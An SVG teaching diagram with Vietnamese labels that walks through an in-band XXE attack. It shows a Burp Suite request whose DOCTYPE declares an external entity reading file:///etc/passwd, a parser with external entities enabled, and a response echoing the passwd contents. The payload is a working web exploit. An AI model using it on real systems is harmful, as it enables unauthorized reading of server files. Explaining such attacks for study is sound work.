<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 950 480" width="100%" height="100%">
  <defs>
    <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#0a0d14"/>
      <stop offset="100%" stop-color="#141923"/>
    </linearGradient>
    <linearGradient id="cardGrad" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#1c2333"/>
      <stop offset="100%" stop-color="#151b27"/>
    </linearGradient>
    <linearGradient id="accentCyan" x1="0%" y1="0%" x2="100%" y2="0%">
      <stop offset="0%" stop-color="#00f2fe"/>
      <stop offset="100%" stop-color="#4facfe"/>
    </linearGradient>
    <linearGradient id="accentRed" x1="0%" y1="0%" x2="100%" y2="0%">
      <stop offset="0%" stop-color="#ff416c"/>
      <stop offset="100%" stop-color="#ff4b2b"/>
    </linearGradient>
    <linearGradient id="accentGreen" x1="0%" y1="0%" x2="100%" y2="0%">
      <stop offset="0%" stop-color="#00ff87"/>
      <stop offset="100%" stop-color="#60efff"/>
    </linearGradient>
    <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur"/>
      <feComposite in="SourceGraphic" in2="blur" operator="over"/>
    </filter>
  </defs>

  <rect width="950" height="480" rx="16" fill="url(#bgGrad)" stroke="#273142" stroke-width="2"/>
  
  <!-- Header -->
  <rect x="30" y="24" width="8" height="28" rx="4" fill="url(#accentCyan)"/>
  <text x="50" y="45" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="20" font-weight="700" fill="#ffffff">Khai Thác In-Band XXE: Đọc Tệp Hệ Thống Cục Bộ</text>
  <text x="50" y="70" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="13" fill="#8899ac">Luồng phân giải thực thể SYSTEM &quot;file:///etc/passwd&quot; và phản hồi dữ liệu nhạy cảm</text>

  <!-- Box 1: Attacker Machine -->
  <g transform="translate(40, 100)">
    <rect width="260" height="340" rx="12" fill="url(#cardGrad)" stroke="#303c54" stroke-width="1.5"/>
    <rect x="0" y="0" width="260" height="40" rx="12" fill="#20293d"/>
    <circle cx="20" cy="20" r="5" fill="#ff5f56"/>
    <circle cx="36" cy="20" r="5" fill="#ffbd2e"/>
    <circle cx="52" cy="20" r="5" fill="#27c93f"/>
    <text x="75" y="25" font-family="monospace" font-size="12" font-weight="600" fill="#a0b3cf">1. Attacker (Burp Suite)</text>

    <!-- Request payload snippet -->
    <rect x="15" y="55" width="230" height="265" rx="8" fill="#0d1117" stroke="#252d3d"/>
    <text x="25" y="78" font-family="monospace" font-size="11" fill="#ff7b72">POST /product/stock</text>
    <text x="25" y="98" font-family="monospace" font-size="10" fill="#79c0ff">&lt;!DOCTYPE test [</text>
    <text x="35" y="118" font-family="monospace" font-size="10" fill="#ffa657">&lt;!ENTITY xxe</text>
    <text x="35" y="138" font-family="monospace" font-size="10" fill="#7ee787">  SYSTEM</text>
    <text x="35" y="158" font-family="monospace" font-size="10" fill="#a5d6ff">  &quot;file:///etc/passwd&quot;&gt;</text>
    <text x="25" y="178" font-family="monospace" font-size="10" fill="#79c0ff">]&gt;</text>
    <text x="25" y="202" font-family="monospace" font-size="10" fill="#d2a8ff">&lt;stockCheck&gt;</text>
    <text x="35" y="222" font-family="monospace" font-size="10" fill="#ff7b72">  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;</text>
    <text x="35" y="242" font-family="monospace" font-size="10" fill="#8b949e">  &lt;storeId&gt;1&lt;/storeId&gt;</text>
    <text x="25" y="262" font-family="monospace" font-size="10" fill="#d2a8ff">&lt;/stockCheck&gt;</text>
    <rect x="30" y="280" width="200" height="28" rx="6" fill="#ff416c" opacity="0.2"/>
    <text x="40" y="298" font-family="sans-serif" font-size="11" font-weight="600" fill="#ff416c">Inject &amp;xxe; vào thẻ input</text>
  </g>

  <!-- Arrow 1 -> 2 -->
  <path d="M 310 200 L 360 200" stroke="#00f2fe" stroke-width="3" fill="none" marker-end="url(#arrowCyan)"/>
  <text x="315" y="190" font-family="monospace" font-size="10" fill="#00f2fe">XML Payload</text>

  <!-- Box 2: Vulnerable Server (XML Parser) -->
  <g transform="translate(370, 100)">
    <rect width="250" height="340" rx="12" fill="url(#cardGrad)" stroke="#ff416c" stroke-width="2"/>
    <rect x="0" y="0" width="250" height="40" rx="12" fill="#2d1c26"/>
    <text x="20" y="25" font-family="sans-serif" font-size="13" font-weight="700" fill="#ff416c">2. Vulnerable App &amp; Parser</text>

    <rect x="15" y="55" width="220" height="90" rx="8" fill="#121722" stroke="#252f44"/>
    <text x="25" y="78" font-family="sans-serif" font-size="12" font-weight="600" fill="#e6edf3">XML Parser (SAX/DOM)</text>
    <text x="25" y="98" font-family="sans-serif" font-size="11" fill="#f85149">⚠ External Entities: BẬT</text>
    <text x="25" y="118" font-family="sans-serif" font-size="11" fill="#8b949e">Gặp thực thể SYSTEM &quot;file://&quot;</text>
    <text x="25" y="133" font-family="sans-serif" font-size="11" fill="#8899ac">-> Đọc ổ đĩa máy chủ</text>

    <!-- Internal file system call -->
    <path d="M 125 155 L 125 210" stroke="#ff416c" stroke-width="2.5" stroke-dasharray="4,4"/>
    
    <rect x="15" y="220" width="220" height="100" rx="8" fill="#0d1117" stroke="#3d4960"/>
    <text x="25" y="245" font-family="monospace" font-size="11" font-weight="600" fill="#7ee787">Local File System</text>
    <text x="25" y="270" font-family="monospace" font-size="11" fill="#a5d6ff">/etc/passwd</text>
    <text x="25" y="290" font-family="monospace" font-size="10" fill="#8b949e">root:x:0:0:root:/root...</text>
    <text x="25" y="306" font-family="monospace" font-size="10" fill="#8b949e">ti:x:1000:1000:ti:...</text>
  </g>

  <!-- Arrow 2 -> 3 -->
  <path d="M 630 200 L 670 200" stroke="#00ff87" stroke-width="3" fill="none"/>
  <text x="635" y="190" font-family="monospace" font-size="10" fill="#00ff87">Echo Output</text>

  <!-- Box 3: Response with Data -->
  <g transform="translate(680, 100)">
    <rect width="230" height="340" rx="12" fill="url(#cardGrad)" stroke="#303c54" stroke-width="1.5"/>
    <rect x="0" y="0" width="230" height="40" rx="12" fill="#1c2b29"/>
    <text x="20" y="25" font-family="monospace" font-size="12" font-weight="600" fill="#00ff87">3. HTTP Response In-Band</text>

    <rect x="15" y="55" width="200" height="265" rx="8" fill="#0a0f16" stroke="#1d2e2b"/>
    <text x="25" y="80" font-family="monospace" font-size="11" fill="#7ee787">HTTP/1.1 200 OK</text>
    <text x="25" y="100" font-family="monospace" font-size="10" fill="#8b949e">Content-Type: text/plain</text>
    <line x1="25" y1="112" x2="205" y2="112" stroke="#21262d"/>
    <text x="25" y="132" font-family="monospace" font-size="10" fill="#ff7b72">Invalid product ID:</text>
    <text x="25" y="152" font-family="monospace" font-size="10" fill="#ffa657">root:x:0:0:root:</text>
    <text x="25" y="172" font-family="monospace" font-size="10" fill="#ffa657">/root:/bin/bash</text>
    <text x="25" y="192" font-family="monospace" font-size="10" fill="#ffa657">daemon:x:1:1:...</text>
    <text x="25" y="212" font-family="monospace" font-size="10" fill="#ffa657">ti:x:1000:1000:ti:</text>
    <text x="25" y="232" font-family="monospace" font-size="10" fill="#ffa657">/home/ti:/bin/bash</text>
    
    <rect x="25" y="260" width="180" height="45" rx="6" fill="#00ff87" opacity="0.15"/>
    <text x="35" y="278" font-family="sans-serif" font-size="11" font-weight="700" fill="#00ff87">Tệp /etc/passwd</text>
    <text x="35" y="294" font-family="sans-serif" font-size="10" fill="#9effd1">Được in thẳng ra màn hình!</text>
  </g>
</svg>